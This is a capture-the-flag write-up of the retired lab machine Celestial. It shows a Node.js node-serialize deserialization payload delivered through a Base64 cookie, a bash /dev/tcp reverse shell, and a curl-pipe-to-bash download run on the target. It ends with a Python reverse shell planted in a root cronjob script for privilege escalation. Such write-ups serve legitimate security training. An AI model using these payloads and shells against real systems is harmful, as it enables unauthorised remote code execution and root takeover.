# Celestial

This is the write-up for the box Celestial that got retired at the 25th August 2018.
My IP address was 10.10.14.20 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.85    celestial.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/celestial.nmap 10.10.10.85
```

```markdown
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

## Checking Node.js Express Framework (Port 3000)

On the web page there is one sentence:
```markdown
Hey Dummy 2 + 2 is 22
```

When examining the HTTP headers with **Burpsuite**, the _Cookie_ header has a value that looks like a Base64-encoded string:
```markdown
Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
```

This needs to be URL-decoded first, because the _%3D_ is an URL-encoded _equal sign_:
```markdown
# URL-decoded:
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==

# Base64-decoded:
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

It decodes as a **JSON Object** which can be modified, then Base64-encoded and sent to the server. Lets modify the _"num"_ key to _100_:
```markdown
# Change num key
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}

# Base64-encoded:
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjEwMCJ9
```

Now the web page displays a different number:
```markdown
Hey Dummy 100 + 100 is 100100
```

This looks like the web server utilizes the cookie and goes through a serialized object which means that exploitation with a **Node.js Deserialization Vulnerability** is possible. More about this type of vulnerability can be read in [this article from OPSECX](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

### Exploiting the Deserialization Vulnerability

I take the payload from the article and modify it to our needs:
```javascript
var y = {
 "username":function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });},
 "country":"Idk Probably Somewhere Dumb",
 "city":"Lametown",
 "num":"100",
}

var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Installing the Node.js dependencies with `npm`:
```markdown
npm install node-serialize
```

Running the script with `node`:
```markdown
node payload.js
```

After executing, it provides the following payload:
```markdown
{"username":"\_$$ND_FUNC$$\_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
```

There has to be some changes in the payload before it works:
```markdown
{"username":"\_$$ND_FUNC$$\_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
```

Now the payload has to be Base64-encoded and sent to the web application in the Cookie header and after sending it, it responses with the following:
```markdown
Hey [object Object] 100 + 100 is 100100
```

This proofs that Remote Code Execution works but it can't show the output of the `ls` command that is specified in the payload. Instead using `ping` to our local client will show us a visual feedback that this payload works:
```markdown
{"username":"\_$$ND_FUNC$$\_require('child_process').exec('ping -c 2 10.10.14.20', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
```

Sniffing the ICMP traffic with **tcpdump**:
```markdown
tcpdump -i tun0 icmp
```

After sending the payload, it sends two pings back and proofs that code execution works.
Now we can upload a reverse shell:
```markdown
bash -i >& /dev/tcp/10.10.14.20/9001 0>&1
```

Payload to upload it on the box:
```markdown
{"username":"\_$$ND_FUNC$$\_require('child_process').exec('curl 10.10.14.20/revshell.sh|bash', function(error, stdout, stderr) { console.log(stdout) })","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"100"}
```

After executing, the listerner on my IP and port 9001 spawns a reverse shell as the user _sun_.

## Privilege Escalation

To get an attack surface, it is wise to run any **Linux Enumeration Script** on the box:
```markdown
curl 10.10.14.20/LinEnum.sh | bash
```

After analyzing the output, it shows that the user is a member of the _adm_ group and thus can read log files.
In the log file _/var/log/syslog_ there is an entry of a **Cronjob** that runs as root:
```markdown
(root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
```

The user _sun_ got permission to write into the _/home/sun/Documents/script.py_ file, so lets replace the code with a Python reverse shell:
```markdown
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Every 5 minutes the cronjob runs and after a while the listener on my IP and port 9002 starts a reverse shell as root!
